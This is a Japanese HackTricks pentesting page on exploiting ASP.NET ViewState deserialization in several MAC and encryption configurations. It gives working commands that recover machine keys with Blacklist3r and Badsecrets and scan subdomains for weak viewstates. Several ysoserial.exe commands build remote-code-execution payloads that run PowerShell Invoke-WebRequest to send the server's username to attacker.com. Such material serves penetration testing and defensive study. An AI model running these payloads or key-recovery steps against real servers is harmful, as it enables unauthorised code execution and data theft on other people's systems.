# \_\_VIEWSTATEの秘密を知らずに悪用する

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングのキャリア**に興味があり、ハッキングできないものをハックしたい方 - **採用中です！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

## ViewStateとは

**ViewState**は、ASP.NETフレームワークがデフォルトで使用する方法で、**ページ間でページとコントロールの値を保持する**ために使われます。ページのHTMLがレンダリングされると、ページの現在の状態とポストバック中に保持する必要がある値がシリアライズされ、base64エンコードされた文字列に変換され、ViewStateの隠しフィールドに出力されます。\
ViewState情報に適用されるプロパティまたはプロパティの組み合わせは以下の通りです:

* Base64
* EnableViewStateMacとViewStateEncryptionMode属性をfalseに設定することで定義可能
* Base64 + MAC (メッセージ認証コード) 有効
* EnableViewStateMac属性をtrueに設定することで定義可能
* Base64 + 暗号化
* viewStateEncryptionMode属性をtrueに設定することで定義可能

## **テストケース**

![](<../../.gitbook/assets/image (309) (2).png>)

### テストケース1: EnableViewStateMac=false および viewStateEncryptionMode=false

`AspNetEnforceViewStateMac`レジストリキーを以下の場所でゼロに設定することにより、ViewStateMACを完全に無効にすることも可能です:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewState属性の特定**

BurpSuiteを使用してこのパラメータを含むリクエストをキャプチャすることで、ViewStateがMACで保護されているかどうかを特定することができます：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

パラメータがMACで保護されていない場合、[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)を使用してそれを悪用することができます。
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### テストケース 1.5 – テストケース 1と同じですが、ViewStateクッキーはサーバーから送信されません

開発者は、HTTPリクエストの一部として**ViewState**を削除することができます（ユーザーはこのクッキーを受け取りません）。\
**ViewState**が**存在しない**場合、ViewStateの逆シリアル化に伴う潜在的な脆弱性から実装が**安全**であると考えるかもしれません。\
しかし、それは違います。リクエストボディに**ViewStateパラメーター**を追加し、ysoserialを使用して作成したシリアライズされたペイロードを送信すると、**ケース 1**で示されたように**コード実行**を達成することができます。

### テストケース: 2 – .Net < 4.5 および EnableViewStateMac=true & ViewStateEncryptionMode=false

**特定のページ**で**ViewState MAC**を**有効**にするためには、特定のaspxファイルで以下の変更を行う必要があります：
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
アプリケーション全体に対しても、以下に示すように **web.config** ファイルで設定することができます：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
パラメータがMACで保護されているため、攻撃を成功させるにはまず使用されているキーが必要です。この場合、BurpSuiteがパラメータがMACで保護されていることを教えてくれます：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

使用されているキーを見つけるために、[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)を試してみることができます。
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
```markdown
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) は既知の machineKeys を識別できる別のツールです。Python で書かれているため、Blacklist3r とは異なり、Windows に依存しません。.NET viewstates には、「python blacklist3r」というユーティリティがあり、これを使用する最も速い方法です。

viewstate と generator を直接指定することもできます：
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

または、直接ターゲットURLに接続し、HTMLからviewstateを切り取ろうとすることもできます：
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

大規模に脆弱なviewstatesを探すために、サブドメイン列挙と併用して、`badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md)モジュールを使用できます:
```
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

もし運が良くて鍵が見つかったら、[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** を使って攻撃を進めることができます。
```
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
サーバーから `_VIEWSTATEGENERATOR` パラメーターが**送信されない**場合、`--generator` パラメーターを**提供する必要はありませんが、これらは必要です**：
```bash
--apppath="/" --path="/hello.aspx"
```
### テストケース：3 - .Net < 4.5 および EnableViewStateMac=true/false および ViewStateEncryptionMode=true

このケースでは、BurpはパラメータがMACで保護されているかどうかを認識できません。したがって、値はおそらく暗号化されており、脆弱性を悪用するためには**Machine Keyが必要です**。

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.0.png)

**この場合、**[**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)**モジュールは開発中です...**

**.NET 4.5より前では**、ASP.NETは**`ViewStateEncryptionMode`**が_**Always**_に設定されていても、ユーザーからの**暗号化されていない**\_`__VIEWSTATE`\_パラメータを**受け入れる**ことができます。ASP.NETはリクエスト内の**`__VIEWSTATEENCRYPTED`**パラメータの**存在**のみを**チェックします**。このパラメータを削除し、暗号化されていないペイロードを送信すると、それでも処理されます。

したがって、Machinekeyが既知である場合（例えば、ディレクトリトラバーサルの問題を通じて）、**ケース2**で使用された[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)コマンドを使用して、ViewStateの逆シリアライズの脆弱性を利用したRCEを実行できます。

* ViewStateの逆シリアライズの脆弱性を悪用するためには、リクエストから`__VIEWSTATEENCRYPTED`パラメータを削除します。そうでなければ、Viewstate MAC検証エラーが返され、図に示すように悪用が失敗します：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.1.png)

### テストケース：4 - .Net >= 4.5 および EnableViewStateMac=true/false および ViewStateEncryptionMode=true/false ただし、両方の属性がfalseの場合を除く

以下のパラメータをweb.configファイル内に指定することで、ASP.NETフレームワークの使用を強制できます。下記のように示されています。
```markup
<httpRuntime targetFramework="4.5" />
```
この操作は、web.configファイルの`machineKey`パラメータ内で以下のオプションを指定することによっても実行できます。
```bash
compatibilityMode="Framework45"
```
前のケースと同様に、Burpは**値が暗号化されている**ため、リクエストがMAC保護されているかどうかを識別しません。したがって、**有効なペイロードを送信するためには、攻撃者はキーが必要です**。

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

使用されているキーを見つけるために、[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)を試してみることができます：
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPathおよびTargetPagePathの詳細な説明については、[こちらを参照してください](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

または、[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)を使用して（generator値付きで）：
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

有効なMachine keyが特定されたら、**次のステップは** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **を使用してシリアライズされたペイロードを生成することです**
```
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
`__VIEWSTATEGENERATOR` の値がある場合、その値を `--generator` パラメータとして **使用** し、`--path` と `--apppath` パラメータを **省略** することができます。

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewStateの逆シリアル化の脆弱性が成功裏に悪用されると、攻撃者が制御するサーバーは、ユーザー名を含むバンド外のリクエストを受信します。[成功した悪用のPoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### テストケース6 – ViewStateUserKeysが使用されている

**ViewStateUserKey** プロパティは、**CSRF攻撃**に対して**防御**するために使用できます。そのようなキーがアプリケーションで定義されており、今まで議論した方法で **ViewState** ペイロードを生成しようとすると、**アプリケーションによってペイロードは処理されません**。\
正しくペイロードを作成するためには、もう一つのパラメータを使用する必要があります：
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### 成功した攻撃の結果 <a href="#poc" id="poc"></a>

すべてのテストケースにおいて、ViewState YSoSerial.Net ペイロードが**成功**すると、サーバーは "**500 Internal server error**" と応答し、応答内容に "**このページの状態情報は無効であり、破損している可能性があります**" と表示され、以下の図に示すように OOB リクエストが得られます：

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

現在のユーザー名を含むバンド外リクエスト

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## 参考文献

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**ハッキングのキャリア**に興味があり、ハッキングできないものをハックしたい方 - **採用情報はこちら！** (_流暢なポーランド語の読み書きが必要です_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWS ハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい**、または **HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や [**テレグラムグループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
